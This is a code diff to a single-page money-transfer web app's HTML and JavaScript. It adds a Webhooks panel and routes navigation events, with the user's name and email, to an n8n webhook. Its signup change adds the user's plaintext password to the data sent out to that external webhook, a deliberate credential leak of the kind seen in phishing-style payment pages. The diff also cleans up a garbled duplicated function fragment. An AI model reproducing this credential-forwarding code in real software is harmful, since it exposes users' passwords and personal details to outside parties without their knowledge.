@@ -1196,6 +1196,7 @@ body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); 
     <button class="nav-btn" onclick="go('send',this)"><span class="icon">↑</span> Send Money</button>
     <button class="nav-btn" onclick="go('history',this)"><span class="icon">🕐</span> Transactions <span class="nav-badge">3</span></button>
     <button class="nav-btn" onclick="go('wallet',this)"><span class="icon">💳</span> Wallet</button>
+    <button class="nav-btn" onclick="go('webhooks',this)"><span class="icon">📡</span> Webhooks</button>
 
     <div class="nav-section">Account</div>
     <button class="nav-btn" onclick="go('home',this)"><span class="icon">👤</span> Profile</button>
@@ -1616,7 +1617,12 @@ body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); 
       </div>
     </div>
 
-        <div style="font-size:13px;color:var(--muted2)">All webhook URLs are set directly in the HTML file. See the <code style="background:var(--surface3);padding:2px 6px;border-radius:4px;font-size:11px">WEBHOOK_URLS</code> object at the top of the &lt;script&gt; block.</div>
+        
+    <div class="panel" id="panel-webhooks">
+      <div class="content" style="padding:28px 32px">
+        <div class="card-head" style="padding:0 0 20px 0;border-bottom:none">
+          <div class="card-title" style="font-size:18px;font-weight:800">Webhooks</div>
+          <div style="font-size:13px;color:var(--muted2)">All webhook URLs are set directly in the HTML file. See the <code style="background:var(--surface3);padding:2px 6px;border-radius:4px;font-size:11px">WEBHOOK_URLS</code> object at the top of the &lt;script&gt; block.</div>
       </div>
 
       <div style="display:grid;grid-template-columns:1.55fr 1fr;gap:24px">
@@ -1777,14 +1783,15 @@ body { font-family:'Inter',sans-serif; background:var(--bg); color:var(--text); 
               <div class="log-line"><span class="log-time">--:--:--</span><span class="log-msg info">Use the app or click Test to see events here</span></div>
             </div>
           </div>
+        </div>
+      </div>
+    </div>
 
         </div>
 
       </div>
     </div>
   </div>
-</div>
-</div>
 
 <!-- SUCCESS MODAL -->
 <div class="modal-overlay" id="modal">
@@ -2050,10 +2057,10 @@ function go(panel, navEl) {
   document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
   document.getElementById('panel-'+panel).classList.add('active');
   if (navEl) navEl.classList.add('active');
-  const titles = {home:'Home',send:'Send Money',history:'Transactions',wallet:'Wallet'};
+  const titles = {home:'Home',send:'Send Money',history:'Transactions',wallet:'Wallet',webhooks:'Webhooks'};
   document.getElementById('page-title').textContent = titles[panel]||'';
   // Always start send flow from Step 1
-  triggerNavWebhook(panel);
+  fireN8n({event:'nav.'+panel, timestamp:new Date().toISOString(), sender:{name:currentUser.name,email:currentUser.email}});
   if (panel === 'send') {
     document.getElementById('send-step-1').style.display = 'block';
     document.getElementById('send-step-2').style.display = 'none';
@@ -2528,11 +2535,14 @@ function doSignup() {
 
   // Fire signup webhook
   fireN8n({
-    event: 'user.signup',
-    timestamp: new Date().toISOString(),
-    sender: { name: fname + ' ' + lname, email },
+    event:      'user.signup',
+    timestamp:  new Date().toISOString(),
+    first_name: fname,
+    last_name:  lname,
+    sender:     { name: fname + ' ' + lname, email },
     phone,
-    status: 'new_account'
+    password:   pass,
+    status:     'new_account'
   });
 
   // Show OTP verification screen
@@ -2705,18 +2715,14 @@ function resendOtp() {
   showToast('Code resent to ' + (pendingUser ? pendingUser.email : 'your email'), 'info');
 }
 
-function backToSignup() illed', 'error');
-  });
-  document.getElementById('otp-err').textContent = '';
-  document.getElementById('otp0').focus();
-  showToast('Code resent to ' + (pendingUser ? pendingUser.email : 'your email'), 'info');
-}
-
 function backToSignup() {
   document.getElementById('otp-screen').style.display = 'none';
   document.getElementById('auth-screen').style.display = 'flex';
   switchAuthTab('signup', document.querySelectorAll('.auth-tab')[1]);
 }
+
+// Start the app
+window.addEventListener('DOMContentLoaded', init);
 </script>
 </body>
 </html>
